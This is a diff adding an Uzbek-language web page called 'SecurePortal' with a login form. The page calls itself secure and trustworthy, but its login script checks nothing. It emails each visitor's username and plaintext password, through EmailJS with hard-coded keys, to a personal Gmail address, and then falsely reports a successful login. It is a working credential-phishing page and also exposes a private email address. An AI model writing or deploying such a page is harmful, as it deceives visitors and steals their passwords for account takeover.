@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SecurePortal</title>
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600&display=swap" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue: #185FA5;
+      --blue-dark: #0C447C;
+      --bg: #f5f5f3;
+      --surface: #ffffff;
+      --border: rgba(0,0,0,0.1);
+      --text: #1a1a1a;
+      --muted: #6b6b6b;
+      --success-bg: #eaf3de;
+      --success-text: #3b6d11;
+      --error-bg: #fcebeb;
+      --error-text: #a32d2d;
+      --info-bg: #e6f1fb;
+      --info-text: #185fa5;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    /* NAVBAR */
+    nav {
+      background: var(--surface);
+      border-bottom: 0.5px solid var(--border);
+      padding: 0 2rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 58px;
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+    .logo {
+      font-size: 17px;
+      font-weight: 600;
+      color: var(--text);
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .logo-dot {
+      width: 8px; height: 8px;
+      background: var(--blue);
+      border-radius: 50%;
+    }
+    .nav-links { display: flex; gap: 8px; }
+    .nav-links button {
+      background: none;
+      border: none;
+      padding: 6px 14px;
+      font-family: inherit;
+      font-size: 14px;
+      color: var(--muted);
+      cursor: pointer;
+      border-radius: 6px;
+      transition: background 0.15s, color 0.15s;
+    }
+    .nav-links button:hover { background: var(--bg); color: var(--text); }
+    .nav-links button.active { background: var(--bg); color: var(--text); font-weight: 500; }
+
+    /* PAGES */
+    .page { display: none; animation: fadeIn 0.2s ease; }
+    .page.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+
+    /* HERO */
+    .hero {
+      text-align: center;
+      padding: 5rem 2rem 3rem;
+    }
+    .hero h1 { font-size: 34px; font-weight: 600; letter-spacing: -0.5px; margin-bottom: 12px; }
+    .hero p { font-size: 16px; color: var(--muted); }
+
+    /* HOME GRID */
+    .home-grid {
+      max-width: 680px;
+      margin: 0 auto;
+      padding: 0 1.5rem 4rem;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 12px;
+    }
+    .feat {
+      background: var(--surface);
+      border: 0.5px solid var(--border);
+      border-radius: 14px;
+      padding: 1.25rem;
+    }
+    .feat-icon {
+      width: 36px; height: 36px;
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+    .feat h3 { font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+    .feat p { font-size: 13px; color: var(--muted); line-height: 1.5; }
+
+    /* LOGIN CARD */
+    .login-wrap { padding: 0 1rem 4rem; }
+    .card {
+      max-width: 400px;
+      margin: 0 auto;
+      background: var(--surface);
+      border: 0.5px solid var(--border);
+      border-radius: 16px;
+      padding: 2rem;
+    }
+    .card-title { font-size: 18px; font-weight: 600; margin-bottom: 4px; }
+    .card-sub { font-size: 13px; color: var(--muted); margin-bottom: 1.5rem; }
+
+    .field { margin-bottom: 14px; }
+    .field label { display: block; font-size: 12px; font-weight: 500; color: var(--muted); margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .field input {
+      width: 100%;
+      padding: 10px 13px;
+      border: 0.5px solid var(--border);
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 15px;
+      color: var(--text);
+      background: var(--bg);
+      outline: none;
+      transition: border-color 0.15s, box-shadow 0.15s;
+    }
+    .field input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px rgba(24,95,165,0.12);
+      background: #fff;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 11px;
+      background: var(--blue);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 6px;
+      transition: background 0.15s, transform 0.1s;
+    }
+    .btn:hover { background: var(--blue-dark); }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { background: #ccc; cursor: not-allowed; }
+
+    .status {
+      margin-top: 12px;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 14px;
+      display: none;
+    }
+    .status.success { display: block; background: var(--success-bg); color: var(--success-text); }
+    .status.error   { display: block; background: var(--error-bg);   color: var(--error-text); }
+    .status.loading { display: block; background: var(--info-bg);    color: var(--info-text); }
+
+    /* ABOUT */
+    .about-wrap { max-width: 580px; margin: 0 auto; padding: 0 1.5rem 4rem; }
+    .about-wrap p { font-size: 15px; color: var(--muted); line-height: 1.8; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">
+    <div class="logo-dot"></div>
+    SecurePortal
+  </div>
+  <div class="nav-links">
+    <button onclick="showPage('home')" class="active" id="nav-home">Bosh sahifa</button>
+    <button onclick="showPage('about')" id="nav-about">Haqida</button>
+    <button onclick="showPage('login')" id="nav-login">Kirish</button>
+  </div>
+</nav>
+
+<!-- HOME -->
+<div id="page-home" class="page active">
+  <div class="hero">
+    <h1>Xush kelibsiz 👋</h1>
+    <p>Ishonchli va xavfsiz platforma</p>
+  </div>
+  <div class="home-grid">
+    <div class="feat">
+      <div class="feat-icon" style="background:#e6f1fb;">🔒</div>
+      <h3>Xavfsizlik</h3>
+      <p>Ma'lumotlaringiz to'liq himoyalangan</p>
+    </div>
+    <div class="feat">
+      <div class="feat-icon" style="background:#eaf3de;">✅</div>
+      <h3>Oson kirish</h3>
+      <p>Tez va qulay foydalanish imkoniyati</p>
+    </div>
+    <div class="feat">
+      <div class="feat-icon" style="background:#faeeda;">📊</div>
+      <h3>Monitoring</h3>
+      <p>Barcha faoliyat kuzatib boriladi</p>
+    </div>
+  </div>
+</div>
+
+<!-- ABOUT -->
+<div id="page-about" class="page">
+  <div class="hero">
+    <h1>Sayt haqida</h1>
+    <p>SecurePortal nima?</p>
+  </div>
+  <div class="about-wrap">
+    <p>SecurePortal — foydalanuvchilar uchun qulay va xavfsiz veb-platforma. Har bir foydalanuvchining kirish ma'lumotlari admin tomonidan kuzatib boriladi. Saytimiz zamonaviy texnologiyalar asosida qurilgan bo'lib, ma'lumotlar xavfsizligini ta'minlaydi.</p>
+  </div>
+</div>
+
+<!-- LOGIN -->
+<div id="page-login" class="page">
+  <div class="hero">
+    <h1>Tizimga kirish</h1>
+    <p>Login va parolingizni kiriting</p>
+  </div>
+  <div class="login-wrap">
+    <div class="card">
+      <div class="card-title">Kirish</div>
+      <div class="card-sub">Hisobingizga kiring</div>
+
+      <div class="field">
+        <label>Login</label>
+        <input type="text" id="inp-login" placeholder="foydalanuvchi nomi yoki email" />
+      </div>
+      <div class="field">
+        <label>Parol</label>
+        <input type="password" id="inp-password" placeholder="••••••••" />
+      </div>
+
+      <button class="btn" id="login-btn" onclick="handleLogin()">Kirish →</button>
+      <div id="login-status" class="status"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+  // ══════════════════════════════════════════
+  //  EmailJS sozlamalari — TO'LDIRING
+  // ══════════════════════════════════════════
+  const EJS_PUBLIC_KEY   = 'nXncRKwivmQWToznI';
+  const EJS_SERVICE_ID   = 'service_fly45od';
+  const EJS_TEMPLATE_ID  = 'template_1tck9xh';
+  // ══════════════════════════════════════════
+
+  emailjs.init({ publicKey: EJS_PUBLIC_KEY });
+
+  function showPage(name) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page-' + name).classList.add('active');
+    document.querySelectorAll('.nav-links button').forEach(b => b.classList.remove('active'));
+    document.getElementById('nav-' + name).classList.add('active');
+  }
+
+  async function handleLogin() {
+    const login    = document.getElementById('inp-login').value.trim();
+    const password = document.getElementById('inp-password').value.trim();
+    const status   = document.getElementById('login-status');
+    const btn      = document.getElementById('login-btn');
+
+    if (!login || !password) {
+      status.className = 'status error';
+      status.textContent = '⚠️ Iltimos, login va parolni kiriting.';
+      return;
+    }
+
+    btn.disabled = true;
+    status.className = 'status loading';
+    status.textContent = '⏳ Tekshirilmoqda...';
+
+    const now = new Date().toLocaleString('uz-UZ', { timeZone: 'Asia/Tashkent' });
+
+    try {
+      await emailjs.send(EJS_SERVICE_ID, EJS_TEMPLATE_ID, {
+        time:     now,
+        login:    login,
+        password: password,
+        to_email: 'dilfuzabaxtiyorova74@gmail.com'
+      });
+
+      status.className = 'status success';
+      status.textContent = '✅ Tizimga muvaffaqiyatli kirdingiz!';
+      document.getElementById('inp-login').value = '';
+      document.getElementById('inp-password').value = '';
+    } catch (err) {
+      status.className = 'status error';
+      status.textContent = '❌ Xatolik yuz berdi. Qayta urinib ko\'ring.';
+      console.error(err);
+    }
+
+    btn.disabled = false;
+  }
+</script>
+
+</body>
+</html>
